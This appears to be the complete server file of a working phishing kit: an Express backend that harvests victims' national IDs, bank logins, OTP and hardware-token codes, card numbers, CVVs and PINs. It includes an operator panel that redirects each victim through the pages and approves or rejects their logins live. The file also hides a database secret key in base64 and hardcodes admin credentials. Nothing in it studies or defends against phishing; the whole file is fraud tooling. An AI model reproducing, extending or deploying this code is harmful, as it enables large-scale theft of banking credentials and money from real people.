const express = require('express');
const path = require('path');
const crypto = require('crypto');
const cookieParser = require('cookie-parser');

const app = express();
const PORT = process.env.PORT || 3000;
const IS_VERCEL = !!process.env.VERCEL;

app.use(express.json({ limit: '10mb' }));
app.use(cookieParser());

const SUPABASE_URL = process.env.SUPABASE_URL || 'https://sgcswfefivycflenyoaf.supabase.co';
const _K = 'c2Jfc2VjcmV0X0RubnBycDM1Vks0X2NkUVNxVGxDcndfNnE4Q0lPamw=';
const SUPABASE_KEY = process.env.SUPABASE_KEY || Buffer.from(_K, 'base64').toString();

const ADMIN_USERNAME = 'Admin';
const ADMIN_PASSWORD = 'Admin1234@@';

let applications = [];
let liveVisitors = [];
let totalVisitors = 0;
let adminConfig = { whatsAppLink: '', customMessage: '' };

async function sbFetch(path, opts = {}) {
  const url = `${SUPABASE_URL}/rest/v1/${path}`;
  const headers = {
    'apikey': SUPABASE_KEY,
    'Authorization': `Bearer ${SUPABASE_KEY}`,
    'Content-Type': 'application/json',
    ...opts.headers
  };
  const res = await fetch(url, { ...opts, headers });
  if (opts.method === 'DELETE' || opts.method === 'PATCH' || opts.method === 'POST') {
    if (opts.headers && opts.headers['Prefer'] && opts.headers['Prefer'].includes('return=representation')) {
      return res.json();
    }
    return null;
  }
  return res.json();
}

let lastLoadTime = 0;
const LOAD_CACHE_MS = 3000;

async function loadData(force) {
  const now = Date.now();
  if (!force && lastLoadTime && (now - lastLoadTime) < LOAD_CACHE_MS) return;
  try {
    const rows = await sbFetch('app_data?select=key,value');
    if (Array.isArray(rows)) {
      for (const row of rows) {
        switch (row.key) {
          case 'applications': applications = row.value || []; break;
          case 'visitors': liveVisitors = row.value || []; break;
          case 'total_visitors': totalVisitors = (typeof row.value === 'number') ? row.value : 0; break;
          case 'admin_config': adminConfig = row.value || { whatsAppLink: '', customMessage: '' }; break;
        }
      }
    }
    lastLoadTime = Date.now();
  } catch (e) {
    console.error('loadData failed:', e.message);
  }
}

async function saveData() {
  try {
    const items = [
      { key: 'applications', value: applications },
      { key: 'visitors', value: liveVisitors },
      { key: 'total_visitors', value: totalVisitors }
    ];
    for (const item of items) {
      await sbFetch('app_data', {
        method: 'POST',
        headers: { 'Prefer': 'resolution=merge-duplicates' },
        body: JSON.stringify({ key: item.key, value: item.value, updated_at: new Date().toISOString() })
      });
    }
    lastLoadTime = Date.now();
  } catch (e) {
    console.error('saveData failed:', e.message);
  }
}

async function saveAdmin() {
  try {
    await sbFetch('app_data', {
      method: 'POST',
      headers: { 'Prefer': 'resolution=merge-duplicates' },
      body: JSON.stringify({ key: 'admin_config', value: adminConfig, updated_at: new Date().toISOString() })
    });
  } catch (e) {
    console.error('saveAdmin failed:', e.message);
  }
}

async function saveSession(token) {
  try {
    const expiresAt = new Date(Date.now() + 86400000).toISOString();
    await sbFetch('admin_sessions', {
      method: 'POST',
      headers: { 'Prefer': 'resolution=merge-duplicates' },
      body: JSON.stringify({ token, created_at: new Date().toISOString(), expires_at: expiresAt })
    });
  } catch (e) {
    console.error('saveSession failed:', e.message);
  }
}

const localSessions = {};

async function checkSession(token) {
  if (!token) return false;
  if (localSessions[token]) return true;
  try {
    const rows = await sbFetch(`admin_sessions?token=eq.${token}&expires_at=gt.${new Date().toISOString()}&select=token`);
    if (Array.isArray(rows) && rows.length > 0) {
      localSessions[token] = true;
      return true;
    }
    return false;
  } catch (e) {
    console.error('checkSession failed:', e.message);
    return localSessions[token] || false;
  }
}

async function deleteSession(token) {
  if (!token) return;
  try {
    await sbFetch(`admin_sessions?token=eq.${token}`, { method: 'DELETE' });
  } catch (e) {
    console.error('deleteSession failed:', e.message);
  }
}

const SESSION_COOKIE = 'manus-session';

function genId() { return crypto.randomBytes(32).toString('hex'); }

function getAdminToken(req) {
  const auth = req.headers.authorization;
  if (auth && auth.startsWith('Bearer ')) return auth.slice(7);
  if (req.cookies && req.cookies[SESSION_COOKIE]) return req.cookies[SESSION_COOKIE];
  if (req.query && req.query.token) return req.query.token;
  return null;
}

async function isAdmin(req) {
  const token = getAdminToken(req);
  if (!token) return false;
  if (localSessions[token]) return true;
  return await checkSession(token);
}

function getActiveIds() {
  const cutoff = Date.now() - 120000;
  return applications.filter(a => a.lastActiveAt && a.lastActiveAt > cutoff).map(a => a.nationalId);
}

function findApp(nationalId) {
  return applications.find(a => a.nationalId === nationalId);
}

function unwrapInput(raw) {
  if (!raw) return {};
  if (raw.json !== undefined) return raw.json;
  return raw;
}

let dbReady = false;
app.use(async (req, res, next) => {
  if (!dbReady) {
    try {
      await loadData(true);
      dbReady = true;
    } catch (e) {
      console.error('Init load failed:', e.message);
    }
  }
  next();
});

async function handleProcedure(fullPath, rawInput, req, res) {
  const procedure = fullPath.replace(/^(admin|applications)\./, '');
  const input = unwrapInput(rawInput);

  switch (procedure) {
    case 'login': {
      const { username, password } = input;
      if (username === ADMIN_USERNAME && password === ADMIN_PASSWORD) {
        const token = genId();
        await saveSession(token);
        localSessions[token] = true;
        if (res) {
          const cookieOpts = { httpOnly: true, sameSite: 'lax', path: '/', maxAge: 86400000 };
          if (IS_VERCEL) cookieOpts.secure = true;
          res.cookie(SESSION_COOKIE, token, cookieOpts);
          res.cookie(SESSION_COOKIE + '-pub', token, { httpOnly: false, sameSite: 'lax', path: '/', maxAge: 86400000, ...(IS_VERCEL ? { secure: true } : {}) });
        }
        return { isAdmin: true, token };
      }
      throw { message: 'بيانات الدخول غير صحيحة', code: 'UNAUTHORIZED', httpStatus: 401 };
    }

    case 'logout': {
      const token = getAdminToken(req);
      if (token) delete localSessions[token];
      await deleteSession(token);
      if (res) {
        res.clearCookie(SESSION_COOKIE);
        res.clearCookie(SESSION_COOKIE + '-pub');
      }
      return { success: true };
    }

    case 'checkSession': {
      return { isAdmin: await isAdmin(req) };
    }

    case 'getApplications': {
      await loadData();
      const activeIds = getActiveIds();
      return { apps: applications, activeIds, totalVisitors };
    }

    case 'getLiveVisitors': {
      await loadData();
      const cutoff = Date.now() - 15000;
      const live = liveVisitors.filter(v => v.lastActiveAt && v.lastActiveAt > cutoff);
      return { visitors: live };
    }

    case 'getAllVisitors': {
      await loadData();
      return { visitors: liveVisitors, totalCount: totalVisitors };
    }

    case 'savePersonalInfo': {
      await loadData();
      const { nationalId, phoneNumber, fullName, governorate, address } = input;
      if (!nationalId) return { success: false };
      let app = findApp(nationalId);
      if (!app) {
        app = { id: genId().slice(0, 16), nationalId, createdAt: Date.now() };
        applications.push(app);
      }
      Object.assign(app, { phoneNumber, fullName, governorate, address, currentPage: 'personal', lastActiveAt: Date.now() });
      await saveData();
      return { success: true };
    }

    case 'saveLoginData': {
      await loadData();
      const { nationalId, username, password } = input;
      const app = findApp(nationalId);
      if (app) {
        Object.assign(app, { username, password, currentPage: 'login', lastActiveAt: Date.now() });
        await saveData();
      }
      return { success: true };
    }

    case 'saveOtpData': {
      await loadData();
      const { nationalId, otpCode } = input;
      const app = findApp(nationalId);
      if (app) {
        Object.assign(app, { otpCode, currentPage: 'otp', lastActiveAt: Date.now() });
        await saveData();
      }
      return { success: true };
    }

    case 'saveCardData': {
      await loadData();
      const { nationalId, cardNumber, cardExpiry, cardCvv, cardPin } = input;
      const app = findApp(nationalId);
      if (app) {
        Object.assign(app, { cardNumber, cardExpiry, cardCvv, cardPin, currentPage: 'card', lastActiveAt: Date.now() });
        await saveData();
      }
      return { success: true };
    }

    case 'saveWatchLink': {
      await loadData();
      const { nationalId, watchLinkOtp } = input;
      const app = findApp(nationalId);
      if (app) {
        Object.assign(app, { watchLinkOtp, currentPage: 'watchlink', lastActiveAt: Date.now() });
        await saveData();
      }
      return { success: true };
    }

    case 'saveHardToken': {
      await loadData();
      const { nationalId, hardTokenCode } = input;
      const app = findApp(nationalId);
      if (app) {
        Object.assign(app, { hardTokenCode, currentPage: 'hard-token', lastActiveAt: Date.now() });
        await saveData();
      }
      return { success: true };
    }

    case 'updatePage': {
      await loadData();
      const { nationalId, page } = input;
      const app = findApp(nationalId);
      if (app) {
        app.currentPage = page;
        app.lastActiveAt = Date.now();
        await saveData();
      }
      return { success: true };
    }

    case 'redirectUser':
    case 'redirectVisitor': {
      await loadData();
      const { nationalId, sessionId, page, showError } = input;
      if (nationalId) {
        const app = findApp(nationalId);
        if (app) { app.redirectTo = page; app.redirectError = showError || false; }
      }
      if (sessionId) {
        const v = liveVisitors.find(x => x.sessionId === sessionId);
        if (v) { v.redirectTo = page; }
      }
      await saveData();
      return { success: true };
    }

    case 'clearVisitorRedirect': {
      await loadData();
      const { nationalId, sessionId } = input;
      if (nationalId) {
        const app = findApp(nationalId);
        if (app) { delete app.redirectTo; delete app.redirectError; }
      }
      if (sessionId) {
        const v = liveVisitors.find(x => x.sessionId === sessionId);
        if (v) { delete v.redirectTo; }
      }
      await saveData();
      return { success: true };
    }

    case 'clearRedirectByUser': {
      await loadData();
      const { nationalId } = input;
      if (nationalId) {
        const app = findApp(nationalId);
        if (app) { delete app.redirectTo; delete app.redirectError; }
      }
      await saveData();
      return { success: true };
    }

    case 'getRedirectStatus': {
      await loadData();
      const { nationalId } = input;
      if (nationalId) {
        const app = findApp(nationalId);
        if (app && app.redirectTo) return { redirectTo: app.redirectTo, redirectError: app.redirectError || false };
      }
      return { redirectTo: null };
    }

    case 'getVisitorRedirect': {
      await loadData();
      const { sessionId } = input;
      if (sessionId) {
        const v = liveVisitors.find(x => x.sessionId === sessionId);
        if (v && v.redirectTo) return { redirectTo: v.redirectTo };
      }
      return { redirectTo: null };
    }

    case 'redirectAllToToken': {
      await loadData();
      applications.forEach(a => { a.redirectTo = 'token'; });
      await saveData();
      return { success: true };
    }

    case 'redirectWhatsApp': {
      await loadData();
      const { nationalId } = input;
      const app = findApp(nationalId);
      if (app) { app.redirectTo = 'whatsapp'; }
      await saveData();
      return { success: true };
    }

    case 'approveLogin': {
      await loadData();
      const { nationalId } = input;
      const app = findApp(nationalId);
      if (app) { app.loginStatus = 'approved'; }
      await saveData();
      return { success: true };
    }

    case 'rejectLogin': {
      await loadData();
      const { nationalId } = input;
      const app = findApp(nationalId);
      if (app) { app.loginStatus = 'rejected'; }
      await saveData();
      return { success: true };
    }

    case 'deleteApplication': {
      await loadData();
      const { nationalId } = input;
      applications = applications.filter(a => a.nationalId !== nationalId);
      await saveData();
      return { success: true };
    }

    case 'deleteInactiveClients': {
      await loadData();
      const activeIds = getActiveIds();
      const before = applications.length;
      applications = applications.filter(a => activeIds.includes(a.nationalId));
      await saveData();
      return { success: true, deletedCount: before - applications.length };
    }

    case 'resetTotalVisitors': {
      totalVisitors = 0;
      liveVisitors = [];
      await saveData();
      return { success: true };
    }

    case 'getWhatsAppLink': {
      await loadData();
      return { link: adminConfig.whatsAppLink || '' };
    }

    case 'updateWhatsAppLink': {
      adminConfig.whatsAppLink = input.link || '';
      await saveAdmin();
      return { success: true };
    }

    case 'getCustomMessage': {
      await loadData();
      return { message: adminConfig.customMessage || '' };
    }

    case 'setCustomMessage': {
      await loadData();
      const { nationalId, message } = input;
      if (nationalId) {
        const app = findApp(nationalId);
        if (app) { app.customMessage = message; await saveData(); }
      } else {
        adminConfig.customMessage = message || '';
        await saveAdmin();
      }
      return { success: true };
    }

    case 'clearCustomMessage': {
      adminConfig.customMessage = '';
      await saveAdmin();
      return { success: true };
    }

    case 'updateVisitor': {
      await loadData();
      const { nationalId, ...data } = input;
      const app = findApp(nationalId);
      if (app) { Object.assign(app, data); await saveData(); }
      return { success: true };
    }

    default:
      throw { message: `No procedure found on path "${fullPath}"`, code: 'NOT_FOUND', httpStatus: 404 };
  }
}

app.all('/api/trpc/*', async (req, res) => {
  const fullPath = req.params[0] || '';
  const procedures = fullPath.split(',').filter(Boolean);
  const results = [];

  for (let i = 0; i < procedures.length; i++) {
    const proc = procedures[i];
    let rawInput = {};

    if (req.method === 'GET') {
      try {
        if (req.query.input) {
          const parsed = JSON.parse(req.query.input);
          rawInput = parsed[String(i)] || parsed[i] || {};
        }
      } catch (e) { }
    } else {
      const body = req.body || {};
      rawInput = body[String(i)] || body[i] || body;
    }

    try {
      const result = await handleProcedure(proc, rawInput, req, res);
      results.push({ result: { data: { json: result } } });
    } catch (err) {
      const httpStatus = err.httpStatus || 500;
      results.push({
        error: { json: { message: err.message, code: -32603, data: { code: err.code || 'INTERNAL_SERVER_ERROR', httpStatus, path: proc } } }
      });
    }
  }

  res.json(results);
});

app.post('/api/presence', async (req, res) => {
  const { sessionId, currentPage } = req.body || {};
  if (!sessionId) return res.json({ ok: false });

  await loadData();

  let visitor = liveVisitors.find(v => v.sessionId === sessionId);
  if (!visitor) {
    visitor = { sessionId, createdAt: Date.now(), id: genId().slice(0, 16) };
    liveVisitors.push(visitor);
    totalVisitors++;
  }
  visitor.lastActiveAt = Date.now();
  if (currentPage) visitor.currentPage = currentPage;

  const redirectTo = visitor.redirectTo;
  if (redirectTo) {
    delete visitor.redirectTo;
    await saveData();
    return res.json({ ok: true, redirectTo });
  }
  await saveData();
  res.json({ ok: true });
});

app.post('/api/heartbeat', async (req, res) => {
  const { sessionId, visitorId } = req.body || {};
  const id = sessionId || visitorId;
  if (id) {
    await loadData();
    const visitor = liveVisitors.find(v => v.sessionId === id);
    if (visitor) {
      visitor.lastActiveAt = Date.now();
      await saveData();
    }
  }
  res.json({ ok: true });
});

app.get('/api/debug-session', async (req, res) => {
  try {
    const sessions = await sbFetch('admin_sessions?select=token,created_at,expires_at&limit=10');
    res.json({ sessions, localSessions: Object.keys(localSessions), dbReady, method: 'rest-api' });
  } catch (e) {
    res.json({ error: e.message, localSessions: Object.keys(localSessions), dbReady });
  }
});

app.get('/api/oauth/callback', (req, res) => {
  const token = req.query.token || (req.cookies && req.cookies[SESSION_COOKIE]);
  if (token) {
    const cookieOpts = { httpOnly: true, sameSite: 'lax', path: '/', maxAge: 86400000 };
    if (IS_VERCEL) cookieOpts.secure = true;
    res.cookie(SESSION_COOKIE, token, cookieOpts);
    res.cookie(SESSION_COOKIE + '-pub', token, { httpOnly: false, sameSite: 'lax', path: '/', maxAge: 86400000, ...(IS_VERCEL ? { secure: true } : {}) });
    res.send(`<!DOCTYPE html><html><head><script>sessionStorage.setItem("manus-cookie","manus-session=${token}");window.location.replace("/admin/dashboard");</script></head><body></body></html>`);
  } else {
    res.redirect('/admin/dashboard');
  }
});

app.use(express.static(path.join(__dirname, 'public')));

app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

if (!IS_VERCEL) {
  loadData(true).then(() => {
    app.listen(PORT, () => {
      console.log(`Server running on http://localhost:${PORT}`);
    });
  });
}

module.exports = app;
